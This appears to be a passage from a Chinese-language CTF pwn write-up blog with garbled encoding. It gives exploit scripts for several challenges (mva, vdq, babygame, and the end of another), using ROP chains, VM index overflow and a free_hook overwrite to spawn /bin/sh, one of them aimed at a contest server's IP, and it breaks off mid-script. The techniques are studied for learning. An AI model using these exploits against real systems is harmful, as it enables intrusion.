recv = sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;YOU WIN\n&#x27;</span> <span class="hljs-keyword">in</span> recv:<br>        <span class="hljs-keyword">break</span><br>    A = <span class="hljs-built_in">int</span>(recv[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>], <span class="hljs-number">10</span>)<br>    B = <span class="hljs-built_in">int</span>(recv[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>], <span class="hljs-number">10</span>)<br>    A = <span class="hljs-built_in">str</span>(A)<br>    B = <span class="hljs-built_in">str</span>(B)<br>    <span class="hljs-keyword">if</span>(total == <span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">break</span><br>    guessli.remove(guess)<br>    <span class="hljs-comment">#print(guessli)</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.isdigit(A) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(A) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">str</span>.isdigit(B) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(B) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(A)+<span class="hljs-built_in">int</span>(B) &lt;= <span class="hljs-number">4</span> :<br>                A = <span class="hljs-built_in">int</span>(A)<br>                B = <span class="hljs-built_in">int</span>(B)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> A == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> B == <span class="hljs-number">0</span> :<br>        guesslis = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslis:<br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> item:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">elif</span> A == <span class="hljs-number">0</span>:<br>        guesslia = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslia:<br>            <span class="hljs-keyword">if</span> item[<span class="hljs-number">0</span>] == guess[<span class="hljs-number">0</span>] :<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">1</span>] == guess[<span class="hljs-number">1</span>]:<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">2</span>] == guess[<span class="hljs-number">2</span>]:<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">3</span>] == guess[<span class="hljs-number">3</span>]:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">if</span> A + B &gt; <span class="hljs-number">0</span>:<br>        guesslib = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslib:<br>            count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> item :<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> count &lt; A + B <span class="hljs-keyword">or</span> count &gt; A + B:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">if</span> A &gt; <span class="hljs-number">0</span>:<br>        guesslie = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslie:<br>            count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] == item[<span class="hljs-number">0</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">1</span>] == item[<span class="hljs-number">1</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">2</span>] == item[<span class="hljs-number">2</span>] :<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">3</span>] == item[<span class="hljs-number">3</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> count &lt; A:<br>                guessli.remove(item)<br><br>sh.sendline(<span class="hljs-string">b&#x27;EXIT&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">b&#x27;(4) EXIT\n&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><br>pop_rax_ret = <span class="hljs-number">0x405b78</span><br>pop_rdx_ret = <span class="hljs-number">0x48546c</span><br>mov_rdi_rax_ret = <span class="hljs-number">0x45beb8</span><br>xchg_rsi_rax_ret = <span class="hljs-number">0x45b327</span><br>syscall_ret = <span class="hljs-number">0x45c849</span><br>payload = <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">0x460</span><br>payload += flat(<br>    pop_rax_ret, <span class="hljs-number">0x68732f6e69622f</span>,<br>    mov_rdi_rax_ret,<br>    pop_rax_ret, <span class="hljs-number">0</span>,<br>    xchg_rsi_rax_ret,<br>    pop_rdx_ret, <span class="hljs-number">0</span>,<br>    pop_rax_ret, <span class="hljs-number">0x3b</span>,<br>    syscall_ret<br>)<br>sh.sendlineafter(<span class="hljs-string">b&#x27;SURE?&#x27;</span>, payload)<br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># sh.sendlineafter(b&#x27;BYE~&#x27;, b&#x27;a&#x27;)</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h3><p>ä¸€ä¸ªvmpwné¢˜ï¼Œæ¯4ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªæŒ‡ä»¤ï¼Œæœ€åä¹Ÿå¾ˆå®¹æ˜“æ‰¾åˆ°è¿™ä¸ªæ•°ç»„çš„è´Ÿæ•°æº¢å‡º</p><img src="/img/15/Screenshot 2023-07-10 143827.png" style="zoom:80%;" /><p>åˆ©ç”¨è¿™ä¸ªæ¼æ´å¯ä»¥æ”¹æ‰popæ“ä½œä¸­çš„æ•°ç»„ç´¢å¼•ï¼Œå®ç°æ ˆä¸Šçš„æ•°æ®ä»»æ„è¯»ï¼Œè¯»å–<code>__libc_start_main</code>å‡½æ•°ï¼Œåˆ©ç”¨åŠ å‡è¿ç®—å¯ä»¥æ”¹ä¸ºone_gadgetï¼Œä½†æ˜¯pushæ“ä½œå¯¹ç´¢å¼•é™åˆ¶äº†å¤§å° ï¼Œå½“æ—¶è‡ªå·±å¹¶æ²¡æœ‰æƒ³åˆ°åˆé€‚æ–¹æ³•æ¥å®ç°æ ˆä¸Šçš„æ•°æ®ä»»æ„å†™ï¼Œçœ‹äº†å…¶ä»–å¸ˆå‚…çš„wpæ‰æç„¶å¤§æ‚Ÿï¼Œpushä¸­æœ‰<code>mov  [rbp+rax*2+var_210], dx</code>ï¼Œåˆ©ç”¨rax*2çš„è´Ÿæ•°æº¢å‡ºå³å¯ç»•è¿‡ç´¢å¼•çš„é™åˆ¶ã€‚</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;mva&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./mva&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">s1, val</span>):<br>    code = p8(<span class="hljs-number">1</span>) + p8(s1) + p8(val &gt;&gt; <span class="hljs-number">8</span>) + p8(val &amp; <span class="hljs-number">0xff</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s1, s2, s3</span>):<br>    code = p8(<span class="hljs-number">2</span>) + p8(s1) + p8(s2) + p8(s3)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">s1, s2, s3</span>):<br>    code = p8(<span class="hljs-number">3</span>) + p8(s1) + p8(s2) + p8(s3)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">s1, s2</span>):<br>    code = p8(<span class="hljs-number">0xe</span>) + p8(s1) + p8(s2) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>():<br>    code = p8(<span class="hljs-number">0x9</span>) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">s1</span>):<br>    code = p8(<span class="hljs-number">0xa</span>) + p8(s1) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br>payload = mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x10e</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf6</span>)<br>payload += pop(<span class="hljs-number">1</span>) + pop(<span class="hljs-number">2</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x582</span>) + sub(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0xc</span>) + add(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x10c</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf6</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf7</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf8</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x8000</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf9</span>)<br>payload += load(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>) + push() + load(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) + push()<br><br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><span class="hljs-comment"># pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="vdq"><a href="#vdq" class="headerlink" title="vdq"></a>vdq</h3><p>åˆæ˜¯ä¸€é“rustçš„é¢˜ï¼Œæµç¨‹å€’æ˜¯å¾ˆç®€å•ï¼Œget_opr_lstå‡½æ•°ä¸­æœ‰ä¸ª<code>serde_json::from_str</code>çš„ååºåˆ—åŒ–æ“ä½œï¼Œå¦‚æœååºåˆ—åŒ–çš„ç»“æœé”™è¯¯æ˜¯ä¼šç›´æ¥é€€å‡ºçš„ï¼Œè‡ªå·±å½“æ—¶ä¸ºäº†ææ¸…æ¥šrustçš„ååºåˆ—åŒ–è¿˜ä¸“é—¨ç¼–è¯‘ä¸€ä¸ªç¨‹åºï¼Œå†å»ç”¨è¯¥ç¨‹åºåœ¨idaä¸­åˆ†æã€‚</p><p>å½“æ—¶çš„æµ‹è¯•çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> serde::&#123;Serialize, Deserialize&#125;;<br><span class="hljs-meta">#[derive(Debug, Serialize, Deserialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>name: <span class="hljs-type">String</span>,<br>    age: <span class="hljs-type">i32</span><br>&#125;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">point</span> = Person &#123;name:<span class="hljs-string">&quot;aaaaa&quot;</span>.<span class="hljs-title function_ invoke__">to_owned</span>(), age:<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">json</span> = serde_json::<span class="hljs-title function_ invoke__">to_string</span>(&amp;point).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, json);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">point1</span>: Person = serde_json::<span class="hljs-title function_ invoke__">from_str</span>(&amp;json).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, point1);<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                       </p><p>å›åˆ°æœ¬é¢˜ä¸Šå»ï¼Œè¦æ±‚ååºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸€ä¸ª<code>Vec&lt;vdq::Operation&gt;</code>ï¼Œvdq::Operationæ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹ï¼š</p><img src="/img/15/Screenshot 2023-07-06 162332.png" style="zoom:80%;" /><p>ææ¸…æ¥šä»¥åï¼Œæœ€åæµ‹è¯•ä¸€ä¸‹åºåˆ—åŒ–ä¼šå˜æˆå­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆå†…å®¹ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> serde::&#123;Serialize, Deserialize&#125;;<br><span class="hljs-meta">#[derive(Debug, Serialize, Deserialize)]</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Operation</span>&#123;<br>    Add,<br>    Remove,<br>    Append,<br>    Archive,<br>    View<br>&#125;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span>:<span class="hljs-type">Vec</span>&lt;Operation&gt; = <span class="hljs-built_in">vec!</span>[Operation::Add, Operation::Remove];<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">json</span>:<span class="hljs-type">String</span> = serde_json::<span class="hljs-title function_ invoke__">to_string</span>(&amp;v).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, json);<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                       </p><p><code>vdq::handle_opr_lst</code>å‡½æ•°å°±æ˜¯å°†ååºåˆ—åŒ–çš„ç»“æœå˜æˆä¸€ä¸ªä¸ªç±»ä¼¼äºå †èœå•çš„æ“ä½œï¼Œè‡ªå·±å½“æ—¶å®Œå…¨æ²¡æœ‰å‘ç°ä»»ä½•æ¼æ´ï¼Œç›´æ¥çœ‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« åæ‰çŸ¥é“è¿˜èƒ½ç›´æ¥ç”¨pythonå†™ä¸€ä¸ªfuzzè„šæœ¬ç›´æ¥å°†æ¼æ´æ‰¾å‡ºæ¥ï¼Œå…·ä½“ç»†èŠ‚å°±ç›´æ¥çœ‹æœ¬æ–‡å¼€å¤´æ¨èçš„æ–‡ç« å§ï¼Œè‡ªå·±å¤ç°æ—¶è¢«rustçš„å †åˆ†é…å¿«æŠ˜ç£¨ç–¯äº†ã€‚</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vdq&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./vdq&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>json_string = <span class="hljs-string">&#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Add&quot;,&#x27;</span><br>json_string += <span class="hljs-string">&#x27;&quot;Remove&quot;, &quot;Remove&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Append&quot;, &quot;Append&quot;&#x27;</span><br>json_string += <span class="hljs-string">&#x27;]&#x27;</span><br><span class="hljs-comment">#json_string = &#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Add&quot;]&#x27;</span><br><span class="hljs-comment"># json_string = b&#x27;&#x27;&#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Archive&quot;, &quot;Archive&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Append&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Archive&quot;, &quot;Add&quot;]&#x27;&#x27;&#x27;</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;!&#x27;</span>, json_string)<br>p.sendline(<span class="hljs-string">b&#x27;$&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x410</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x410</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;:\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27; -&gt; &#x27;</span>)<br>leak = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    leak += (<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>))<br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x10</span> - <span class="hljs-number">96</span><br>libc.address = libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">7</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x12</span> - <span class="hljs-number">8</span> * <span class="hljs-number">4</span>) + p64(<span class="hljs-number">0</span>))<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>å”¯ä¸€ä¸€ä¸ªè‡ªå·±æˆåŠŸå†™å‡ºæ¥çš„é¢˜ã€‚</p><p>è¿™é‡Œçš„å˜é‡v5å¯ä»¥ç›´æ¥è¢«åé¢çš„æº¢å‡ºè¦†ç›–ï¼Œè®©æ¥ä¸‹æ¥çš„æ¸¸æˆä¸­çš„éšæœºæ•°å˜æˆä¼ªéšæœºæ•°</p><img src="/img/15/Screenshot 2023-07-10 173013.png" style="zoom: 80%;" /><p>é¡ºåˆ©é€šè¿‡æ¸¸æˆåå°±æœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†åªæœ‰ä¸€æ¬¡ï¼Œæ³„æ¼å‡ºç›¸å…³ä¿¡æ¯åè¿˜è¦æ”¹å˜è¿”å›åœ°å€ï¼Œæ‰€ä»¥éœ€è¦æ ˆä¸Šçš„ä¸€äº›ä¸è¿”å›åœ°å€è·ç¦»æ¯”è¾ƒè¿‘çš„æ ˆå€¼å»ä¿®æ”¹ï¼Œå½“ç„¶è¿™æœ‰1&#x2F;16çš„æœºç‡ä¿®æ”¹æˆåŠŸ</p><img src="/img/15/Screenshot 2023-07-10 164617.jpg" style="zoom:80%;" /><p>ä¿®æ”¹è¿”å›å€¼ä¸º0x153Eï¼Œå†æ¬¡ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåˆ©ç”¨ä¹‹å‰æ³„æ¼çš„ä¿¡æ¯å»æ”¹å˜è¿”å›åœ°å€ä¸ºä¸»å‡½æ•°ï¼Œåˆ©ç”¨æ ˆæº¢å‡ºç›´æ¥ROPã€‚</p><p>å®Œæ•´exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babygame&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./babygame&#x27;, aslr=False)</span><br>p = remote(<span class="hljs-string">&#x27;112.74.186.148&#x27;</span>,<span class="hljs-number">49378</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span 